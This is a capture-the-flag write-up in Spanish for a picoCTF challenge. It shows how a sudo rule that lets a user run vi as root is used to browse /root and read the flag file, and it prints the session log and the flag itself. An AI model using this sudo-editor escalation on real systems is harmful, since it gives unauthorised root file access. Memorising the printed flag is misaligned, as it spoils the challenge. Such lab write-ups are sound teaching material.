### Descripción
Can you read files in the root file?

Hint: What permissions do you have?
### Solución
1. Entrar por ssh
2. Poner la contraseña
3. Ejecutar el comando ``` sudo -l ```
4. Luego ejecutar ```sudo vi /root```
5. Entrar al archivo flag.txt
6. Ya dentro de flag.txt : picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}

```
~ via 🐍 v3.13.5 
➜ ssh -p 58970 picoplayer@saturn.picoctf.net


picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
    

picoplayer@challenge:~$ sudo vi /root


** This session may be vulnerable to "store now, decrypt later" attacks.
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /root
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../
./                                                                                                                                 
.vim/
.bashrc
.flag.txt        ←
.profile
~                                                                                ~                                              
"~/" is a directory 

--- Dentro de flag.txt

picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}

```
**Flag**: picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
### Notas Adicionales
 - sudo -l →  muestra qué comandos puedes ejecutar con sudo sin contraseña
 - sudo vi /root → sudo (ejecuta como root), vi (abre el editor de Vi/Vim) y /root (directorio home del usuario root). Entonces Vim mostrará un explorador de archivos internos.
### Referencias